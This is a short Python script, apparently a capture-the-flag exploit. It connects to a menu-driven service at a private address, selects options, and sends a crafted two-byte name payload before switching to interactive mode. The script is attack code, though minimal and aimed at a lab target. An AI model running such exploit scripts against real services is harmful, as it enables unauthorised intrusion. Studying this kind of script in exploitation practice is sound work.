from PwnIOI import *

s = IOI(['192.168.0.85',1234])
s.read_until('choice :')
s.write('1\n')
s.read_until('Index :')
s.write('1\n')
s.read_until('Name :')
s.write('\xf7\x00')
s.interact()
